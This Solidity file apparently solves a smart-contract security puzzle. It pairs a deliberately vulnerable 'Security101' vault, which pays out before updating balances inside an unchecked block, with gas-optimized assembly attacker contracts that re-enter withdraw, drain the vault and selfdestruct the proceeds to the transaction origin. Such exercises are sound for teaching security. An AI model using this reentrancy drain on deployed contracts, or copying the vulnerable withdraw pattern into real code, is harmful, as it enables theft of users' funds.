// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract Attacker {
    address internal immutable attacked;

    constructor(address _attacked) payable {
        attacked = _attacked;
        assembly {
            mstore(0, 0xd0e30db0)
            let suc := call(gas(), _attacked, callvalue(), 28, 8, 0, 0)
        }
    }

    receive() external payable {
        address _attacked = attacked;
        assembly {
            let amt := 1000000000000000000
            if gt(selfbalance(), amt) { stop() }
            
            let _balance := selfbalance()
            mstore( 0, 0x2e1a7d4d)
            mstore(32, amt)
            let suc := call(gas(), _attacked, 0, 28, 36, 0, 0)

            if eq(_balance, amt) { stop() }

            mstore(32, balance(_attacked))
            suc := call(gas(), _attacked, 0, 28, 36, 0, 0)
            selfdestruct(origin())
        }
    }
}

contract OptimizedAttackerSecurity101{
    constructor (address _attacked) payable {
        Attacker _attacker = new Attacker{value: msg.value}(_attacked);
        assembly {
            let res := call(gas(), _attacker, 0, 0, 0, 0, 0)
            selfdestruct(origin())
        }
    }
}
